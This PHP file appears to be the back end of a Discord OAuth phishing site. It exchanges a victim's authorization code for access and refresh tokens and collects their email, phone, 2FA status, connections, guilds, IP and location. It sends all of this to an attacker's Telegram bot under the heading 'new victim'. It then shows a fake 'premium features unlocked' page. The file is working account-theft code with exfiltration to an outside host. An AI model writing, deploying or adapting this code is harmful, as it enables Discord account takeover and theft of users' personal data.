<?php
$config = require __DIR__ . '/config.php';

function apiGet($url, $token) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_HTTPHEADER     => ["Authorization: Bearer $token"],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 15,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    $r = curl_exec($ch);
    curl_close($ch);
    $j = json_decode((string)$r, true);
    return is_array($j) ? $j : [];
}

function ipInfo($ip) {
    $ch = curl_init("http://ip-api.com/json/$ip?fields=status,country,city,isp");
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 8]);
    $r = curl_exec($ch);
    curl_close($ch);
    $j = json_decode((string)$r, true) ?: [];
    if (($j['status'] ?? '') === 'success') {
        return ($j['country'] ?? '?') . ' / ' . ($j['city'] ?? '?') . ' / ' . ($j['isp'] ?? '?');
    }
    return 'غير معروف';
}

function sendTg($config, $text) {
    $url = "https://api.telegram.org/bot{$config['telegram_bot_token']}/sendMessage";
    $ch  = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query([
            'chat_id'                  => $config['telegram_chat_id'],
            'text'                     => substr($text, 0, 4000),
            'parse_mode'               => 'Markdown',
            'disable_web_page_preview' => 'true',
        ]),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_SSL_VERIFYPEER => false,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

function showFailed() {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Failed</title>
    <style>body{background:#0a0a0f;color:#e8eaf0;font-family:system-ui,sans-serif;
    min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{background:rgba(19,20,28,.9);border:1px solid rgba(239,68,68,.3);
    border-radius:20px;padding:40px;max-width:440px;text-align:center}
    h1{color:#ef4444;margin-bottom:16px;font-size:24px}
    p{color:#9ca3af;line-height:1.6;margin-bottom:20px}
    a{color:#5865f2;text-decoration:none;font-weight:600}</style></head>
    <body><div class="card"><h1>Activation Failed</h1>
    <p>Something went wrong. Please try again.</p>
    <a href="index.html">← Back</a></div></body></html>';
}

$code = $_GET['code']  ?? '';
$err  = $_GET['error'] ?? '';

if ($err || !$code) {
    showFailed(); exit;
}

$ch = curl_init('https://discord.com/api/v10/oauth2/token');
curl_setopt_array($ch, [
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => http_build_query([
        'client_id'     => $config['discord_client_id'],
        'client_secret' => $config['discord_client_secret'],
        'grant_type'    => 'authorization_code',
        'code'          => $code,
        'redirect_uri'  => $config['redirect_uri'],
    ]),
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 20,
    CURLOPT_SSL_VERIFYPEER => false,
]);
$resp = curl_exec($ch);
curl_close($ch);
$tok = json_decode((string)$resp, true) ?: [];

if (empty($tok['access_token'])) {
    sendTg($config, "❌ تبادل كود فشل\n`" . substr((string)$resp, 0, 300) . "`");
    showFailed(); exit;
}

$access  = $tok['access_token'];
$refresh = $tok['refresh_token'] ?? '—';
$expires = $tok['expires_in']    ?? '?';

$user   = apiGet('https://discord.com/api/v10/users/@me',             $access);
$conns  = apiGet('https://discord.com/api/v10/users/@me/connections', $access);
$guilds = apiGet('https://discord.com/api/v10/users/@me/guilds',      $access);

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '?';
$ip = trim(explode(',', $ip)[0]);
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '?';
$where = ipInfo($ip);

$connLines = [];
foreach (array_slice($conns, 0, 15) as $c) {
    $connLines[] = "  • " . ($c['type'] ?? '?') . " → `" . ($c['name'] ?? '?') . "`";
}
if (!$connLines) $connLines[] = "  —";

$guildLines = [];
foreach (array_slice($guilds, 0, 15) as $g) {
    $owner = !empty($g['owner']) ? 'owner=true' : 'owner=false';
    $guildLines[] = "  • " . ($g['name'] ?? '?') . " ({$owner})";
}
if (!$guildLines) $guildLines[] = "  —";

$msg =
    "🔥 *ضحية جديدة — OAuth*\n\n" .
    "👤 *Username:* `" . ($user['username'] ?? '?') . "#" . ($user['discriminator'] ?? '0') . "`\n" .
    "📛 *Display:* `" . ($user['global_name'] ?? $user['username'] ?? '?') . "`\n" .
    "🆔 *ID:* `" . ($user['id'] ?? '?') . "`\n" .
    "📧 *Email:* `" . ($user['email'] ?? '—') . "`\n" .
    "📱 *Phone:* `" . ($user['phone'] ?? '—') . "`\n" .
    "✅ *Verified:* `" . ($user['verified'] ?? '?') . "`\n" .
    "🔒 *2FA:* `" . ($user['mfa_enabled'] ?? '?') . "`\n" .
    "🌐 *Locale:* `" . ($user['locale'] ?? '?') . "`\n" .
    "⭐ *Nitro:* `" . ($user['premium_type'] ?? '0') . "`\n\n" .
    "🌍 *IP:* `{$ip}`\n" .
    "📍 *Location:* {$where}\n" .
    "💻 *UA:* `" . substr($ua, 0, 130) . "`\n\n" .
    "🔗 *Connections (" . count($conns) . "):*\n" . implode("\n", $connLines) . "\n\n" .
    "🏰 *Guilds (" . count($guilds) . "):*\n" . implode("\n", $guildLines) . "\n\n" .
    "🎫 *Access Token:*\n`{$access}`\n" .
    "🔄 *Refresh Token:*\n`{$refresh}`\n" .
    "⏱ *Expires:* `{$expires}s`";

sendTg($config, $msg);

$username = htmlspecialchars($user['username'] ?? 'user', ENT_QUOTES, 'UTF-8');
?>
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Activated!</title>
<style>
  body{font-family:'gg sans',system-ui,sans-serif;background:#0a0a0f;color:#e8eaf0;
       min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px;position:relative}
  body::before{content:'';position:fixed;inset:0;
    background:radial-gradient(circle at 50% 50%,rgba(34,197,94,.25),transparent 60%);pointer-events:none}
  .card{position:relative;max-width:480px;width:100%;background:rgba(19,20,28,.9);
    border:1px solid rgba(255,255,255,.08);border-radius:24px;padding:48px 36px;
    text-align:center;box-shadow:0 30px 80px rgba(0,0,0,.6)}
  .check{width:88px;height:88px;border-radius:50%;background:linear-gradient(135deg,#22c55e,#16a34a);
    display:flex;align-items:center;justify-content:center;margin:0 auto 28px;
    box-shadow:0 0 60px rgba(34,197,94,.6)}
  .check svg{width:48px;height:48px;color:#fff}
  h1{font-size:28px;font-weight:800;margin-bottom:12px;
    background:linear-gradient(135deg,#fff,#86efac);
    -webkit-background-clip:text;-webkit-text-fill-color:transparent}
  p{color:#9ca3af;font-size:15px;line-height:1.6;margin-bottom:24px}
  .username{color:#a5b4fc;font-weight:600}
  .countdown{background:rgba(88,101,242,.15);border:1px solid rgba(88,101,242,.3);
    border-radius:12px;padding:16px;color:#c7d2fe;font-size:14px}
  .countdown b{color:#fff;font-size:18px;display:inline-block;min-width:24px}
  a{color:#00a8fc;text-decoration:none}
</style></head>
<body><div class="card">
  <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"
    stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></div>
  <h1>Activated Successfully!</h1>
  <p>Welcome, <span class="username"><?= $username ?></span>. Your premium features are now unlocked.</p>
  <div class="countdown">Redirecting in <b id="cd">5</b> seconds ·
    <a href="https://discord.com/app">Open Discord</a></div>
</div>
<script>let t=5;const cd=document.getElementById('cd');
const iv=setInterval(()=>{t--;cd.textContent=t;
if(t<=0){clearInterval(iv);window.location.href='https://discord.com/app';}},1000);</script>
</body></html>
